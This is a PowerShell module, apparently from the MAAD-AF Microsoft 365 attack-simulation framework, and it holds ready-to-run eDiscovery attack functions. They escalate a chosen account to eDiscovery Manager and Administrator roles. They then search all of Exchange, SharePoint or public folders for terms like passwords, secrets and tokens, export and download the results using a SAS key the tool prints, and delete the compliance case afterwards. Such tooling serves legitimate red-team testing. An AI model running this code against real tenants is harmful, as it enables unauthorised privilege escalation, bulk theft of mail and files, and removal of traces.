#Compliance & Security Functions
function Display_E_Discovery_Cases ($selection = $false) {
    $all_e_discovery_cases = Get-ComplianceCase
    Write-Host ""

    if ($null -eq $all_e_discovery_cases){
        MAADWriteError "No eDiscovery cases found" 
        return
    }

    MAADWriteProcess "Fetching eDiscovery cases" 
    foreach ($item in $all_e_discovery_cases){
        Write-Host $([array]::IndexOf($all_e_discovery_cases,$item)+1) ':' $item.Name
    } 

    while ($selection) {
        try {
            [int]$case_choice = Read-Host "`n[?] Select a case"
            Write-Host ""
            $global:selected_case = $all_e_discovery_cases[$case_choice-1].Name
            break
        }
        catch {
            MAADWriteError "Choose a case from the list" 
        }   
    }
}

function Display_E_Discovery_Case_Searches ($selection = $false, $case_name) {
    $all_case_searches = Get-ComplianceSearch -Case $case_name

    MAADWriteProcess "$($all_case_searches.Count) searches found in case -> $case_name" 
    if ($all_case_searches -is [array]) {
        foreach ($item in $all_case_searches){
            Write-Host $([array]::IndexOf($all_case_searches,$item)+1) ':' $item.Name
        }
    }
    else {
        $selection = $false
        $global:selected_search = $all_case_searches.Name
        MAADWriteProcess "Target search -> $global:selected_search"
    }

    while ($selection) {
        try {
            [int]$search_choice = Read-Host -Prompt "`n[?] Select a search"
            Write-Host ""
            $global:selected_search = $all_case_searches[$search_choice-1].Name
            break
        }
        catch {
            MAADWriteError "Choose an option number from the list" 
        }   
    }
}

function E_Discovery_Downloader ($case_name, $export_name){

    $export_tool = ((Get-ChildItem -Path $($env:LOCALAPPDATA + "\Apps\2.0\") -Filter microsoft.office.client.discovery.unifiedexporttool.exe -Recurse).FullName | Where-Object{ $_ -notmatch "_none_" } | Select-Object -First 1)    
    $export_location = ".\Outputs\"
    
    ##Export Details
    $export_details = Get-ComplianceSearchAction -Case $case_name -Identity $export_name -IncludeCredential -Details
    $export_details = $export_details.Results.split(";")
    $container_url = $export_details[0].trimStart("Container url: ")
    $sas_token = $export_details[1].trimStart(" SAS token: ")

    MAADWriteProcess "Download URL -> $container_url"
    MAADWriteProcess "Download Key -> $sas_token"

    #Download the exported file from M365
    MAADWriteProcess "Initiating download of export" 
    
    #Start-Process -FilePath $export_tool -ArgumentList $Arguments
    & $export_tool -name $export_name -source $container_url -key $sas_token -dest $export_location -trace true
    
    MAADWriteProcess "Output Saved -> $export_location"
    MAADWriteSuccess "Download Completed"
    MAADPause
}

function E_Discovery_Priv_Esc {

    EnterAccount "`n[?] Enter account to escalate privileges (user@org.com)"
    $target_account = $global:account_username

    $role_members = Get-RoleGroupMember "eDiscovery Manager"
    $admin_role_members = Get-eDiscoveryCaseAdmin

    #Check eDiscovery Admin 
    if ((Get-AzureADUser -ObjectId $target_account).DisplayName -notin $admin_role_members.Name){

        ###Not eDiscovery Manager
        if ((Get-AzureADUser -ObjectId $target_account).DisplayName -notin $role_members.Name){ 
            #Escalate to Manager
            try {
                MAADWriteProcess "Attempting privilege escalation -> eDiscovery Manager role" 
                Add-RoleGroupMember -Identity "eDiscovery Manager" -Member $target_account -ErrorAction Stop | Out-Null
                MAADWriteProcess "Role assigned to user"
                MAADWriteProcess "Waiting for changes to take effect" 
                Start-Sleep -Seconds 30
                MAADWriteSuccess "Elevated Privileges to eDiscovery Manager"
            }
            catch {
                MAADWriteError "Failed privilege escalation to eDiscovery Manager" 
                break
            }
        }
        
        ###Escalate to eDiscovery Admin
        try {
            MAADWriteProcess "Attempting privilege escalation to eDiscovery Administrator role" 
            Add-eDiscoveryCaseAdmin -User $target_account | Out-Null
            MAADWriteProcess "Role assigned to user"
            MAADWriteProcess "Waiting for changes to take effect" 
            Start-Sleep -Seconds 30
            MAADWriteSuccess "Elevated Privileges to eDiscovery Admin"
        }
        catch {
            MAADWriteError "Failed privilege escalation to eDiscovery Admin" 
            break
        }
    }
    else {
        MAADWriteProcess "Sometimes life isn't that hard ;)" 
        MAADWriteProcess "User is already eDiscovery Admin & eDiscovery Manager" 
    }
    MAADPause
}

#Create a new search and export data
function Create_New_Search {
    $search_create_options = @([PSCustomObject]@{"#" = 1; "Option" = "New Case"}; [PSCustomObject]@{"#" = 2; "Option" = "Existing Case"})
    $search_create_options | Format-Table

    $new_search_choice = Read-Host -Prompt "[?] Select option"

    if ($new_search_choice -eq 1) {
        $case_name = Read-Host -Prompt "`n[?] Enter new eDiscovery case name"
        Write-Host ""
        $description = "$case_name"
        ##  Create case
        MAADWriteProcess "Creating new case -> $case_name" 
        New-ComplianceCase -Name $case_name -Description $description | Out-Null
    }

    if ($new_search_choice -eq 2) {
        Display_E_Discovery_Cases $true
        $case_name = $selected_case
    }

    $search_name = Read-Host "`n[?] Enter new search name"
    Write-Host ""
    $export_location = ".\Outputs\"

    #Query to use for eDiscovery
    MAADWriteInfo "Search term example: pass* or secret or CEO or credentials or token"
    $searchQry = Read-Host -Prompt "`n[?] Enter eDiscovery search keywords (add multiple keywords separeted by [or]"
    Start-Sleep -Seconds 3

    #Create search location options list
    $search_location_options = @([PSCustomObject]@{"Option" = 1; "Location" = "Exchange"}; [PSCustomObject]@{"Option" = 2; "Location" = "SharePoint"}; [PSCustomObject]@{"Option" = 3; "Location" = "Public Folder"})

    #Display search location options
    $search_location_options | Format-Table @{Label="#";Expression={$tf = "4"; $e = [char]27; "$e[${tf}m$($_.Option)${e}[0m"}}, Location

    MAADWriteInfo "MAAD-AF will search the entire selected location"
    $search_location = Read-Host -Prompt "`n[?] Select search location"
    Write-Host ""

    ##  Initiate Search query
    if ($search_location -eq 1) {
        $compSearch = New-ComplianceSearch -Case $case_name -Name $search_name -ExchangeLocation all -ContentMatchQuery $searchQry -Confirm:$false 
    }
    elseif ($search_location -eq 2 ) {
        $compSearch = New-ComplianceSearch -Case $case_name -Name $search_name -SharepointLocation all -ContentMatchQuery $searchQry -Confirm:$false
    }
    elseif ($search_location -eq 3 ) {
        $compSearch = New-ComplianceSearch -Case $case_name -Name $search_name -PublicFolderLocation  all -ContentMatchQuery $searchQry -Confirm:$false
    }

    MAADWriteProcess "Search query -> $searchQry" 
    MAADWriteProcess "Search location -> $($($search_location_options | Where-Object {$_.Option -eq [int]$search_location}).Location)" 

    ##  Start Actual search
    try {
        MAADWriteProcess "Search in progress" 
        Start-ComplianceSearch -Identity $search_name -ErrorAction Stop | Out-Null
    }
    catch {
        MAADWriteError "Failed to start compliance search" 
        break
    }
    
    do
        {
            Start-Sleep -s 5
            $complianceSearch = Get-ComplianceSearch -Identity $search_name
        }
    while ($complianceSearch.Status -ne "Completed")

    MAADWriteProcess "Search completed"
    MAADWriteProcess "Fetching search result summary"
    $search_details = Get-ComplianceSearch -Identity $search_name
    $search_details | Format-Table CreatedBy, Items, ExchangeLocation, SharepointLocation,PublicFolderLocation, NumFailedSources
    
    MAADWriteSuccess "Compliance Search completed" 
    MAADPause
}

function Install_Unified_Export_Tool {
    
    ###This unified export tool installer module is thanks to Dale O'Grady's script for attack lab and is essentially a copy of that###
    ##Check if microsoft.office.client.discovery.unifiedexporttool.exe tool is already installed. Install it otherwise
    While (-Not ((Get-ChildItem -Path $($env:LOCALAPPDATA + "\Apps\2.0\") -Filter microsoft.office.client.discovery.unifiedexporttool.exe -Recurse).FullName | Where-Object{ $_ -notmatch "_none_" } | Select-Object -First 1)){
        MAADWriteProcess "Downloading Unified Export Tool"
        MAADWriteInfo "This is installed per-user by the Click-Once installer"

        # Credit to Jos Verlinde for his code in Load-ExchangeMFA in the Powershell Gallery!
        # https://www.powershellgallery.com/packages/Load-ExchangeMFA/1.2

        $Manifest = "https://complianceclientsdf.blob.core.windows.net/v16/Microsoft.Office.Client.Discovery.UnifiedExportTool.application"
        $ElevatePermissions = $true
        Try {
            Add-Type -AssemblyName System.Deployment
            MAADWriteProcess "Starting installation of ClickOnce Application -> $Manifest" 
            $RemoteURI = [URI]::New( $Manifest , [UriKind]::Absolute)
            if (-not  $Manifest){
                throw "Invalid ConnectionUri parameter '$ConnectionUri'"
            }
            $HostingManager = New-Object System.Deployment.Application.InPlaceHostingManager -ArgumentList $RemoteURI , $False
            Register-ObjectEvent -InputObject $HostingManager -EventName GetManifestCompleted -Action { 
                new-event -SourceIdentifier "ManifestDownloadComplete"
            } | Out-Null
            Register-ObjectEvent -InputObject $HostingManager -EventName DownloadApplicationCompleted -Action { 
                new-event -SourceIdentifier "DownloadApplicationCompleted"
            } | Out-Null
            $HostingManager.GetManifestAsync()
            $check_event = Wait-Event -SourceIdentifier "ManifestDownloadComplete" -Timeout 15
            if ($check_event ) {
                $check_event | Remove-Event
                MAADWriteProcess "ClickOnce manifest download completed" 
                $HostingManager.AssertApplicationRequirements($ElevatePermissions)
                $HostingManager.DownloadApplicationAsync()
                $check_event = Wait-Event -SourceIdentifier "DownloadApplicationCompleted" -Timeout 60
                if ($check_event ) {
                    $check_event | Remove-Event
                    MAADWriteSuccess "ClickOnce Application Download Completed"
                }
                else {
                    Write-error "ClickOnce Application Download did not complete in time (60s)"
                }
            }
            else {
                Write-error "ClickOnce Manifest Download did not complete in time (15s)"
            }
        }
        finally {
            Get-EventSubscriber|? {$_.SourceObject.ToString() -eq 'System.Deployment.Application.InPlaceHostingManager'} | Unregister-Event
        }
    }
    MAADWriteProcess "Unified Export tool already installed"
    MAADPause
}

function EDiscoveryExfil {
    #Export and Download a Search"
    Display_E_Discovery_Cases $true
    
    if ($null -ne $global:selected_case){   
        Display_E_Discovery_Case_Searches $true $global:selected_case
        $export_name = $global:selected_search + "_Export"

        if ($global:selected_search -notin "",$null){
            try {
                MAADWriteProcess "Creating new compliance search action" 
                New-ComplianceSearchAction -SearchName $global:selected_search -Export -Format FxStream -ExchangeArchiveFormat PerUserPst -Scope BothIndexedAndUnindexedItems -EnableDedupe $true -SharePointArchiveFormat IndividualMessage -IncludeSharePointDocumentVersions $true -Confirm:$false -ErrorAction Stop
                #Check and wait for SearchAction to complete
                MAADWriteProcess "Waiting for compliance search action to complete"
                do
                    {
                        Start-Sleep -s 5
                        $complianceSearchAction = Get-ComplianceSearchAction -Case $global:selected_case -Identity $export_name -IncludeCredential -Details
                    }
                while ($complianceSearchAction.Status -ne "Completed")

                #Start download
                E_Discovery_Downloader $global:selected_case $export_name
                break
            }
            catch {
                MAADWriteError "Failed to export search" 
                MAADWriteProcess "Attempting to re-run search" 
                Start-ComplianceSearch -Identity $global:selected_search
                do
                    {
                        Start-Sleep -s 5
                        $complianceSearch = Get-ComplianceSearch -Identity $global:selected_search
                    }
                while ($complianceSearch.Status -ne "Completed")
                MAADWriteProcess "Search re-run completed"   
            }
        
            try {
                MAADWriteProcess "Creating new compliance search action" 
                New-ComplianceSearchAction -SearchName $global:selected_search -Export -Format FxStream -ExchangeArchiveFormat PerUserPst -Scope BothIndexedAndUnindexedItems -EnableDedupe $true -SharePointArchiveFormat IndividualMessage -IncludeSharePointDocumentVersions $true -Confirm:$false -ErrorAction Stop
                #Check and wait for SearchAction to complete
                MAADWriteProcess "Waiting for compliance search action to complete"
                do
                    {
                        Start-Sleep -s 5
                        $complianceSearchAction = Get-ComplianceSearchAction -Case $global:selected_case -Identity $export_name -IncludeCredential -Details
                    }
                while ($complianceSearchAction.Status -ne "Completed")
                MAADWriteProcess "Compliance search action completed" 
                #Start download
                E_Discovery_Downloader $global:selected_case $export_name
            }
            catch {
                MAADWriteError "Failed to export search" 
            }
        }
        else {
            MAADWriteError "No search available in selected case to export" 
        }
    }
    MAADPause
}

function DeleteComplianceCase {
    Display_E_Discovery_Cases $true

    if ($null -ne $global:selected_case){
        try {
            MAADWriteProcess "Deleting compliance case -> $global:selected_case" 
            Remove-ComplianceCase -Identity $global:selected_case -Confirm:$false | Out-Null
            MAADWriteSuccess "Compliance Case Deleted"
        }
        catch {
            MAADWriteError "Failed to delete compliance case" 
        }   
    }
    MAADPause
}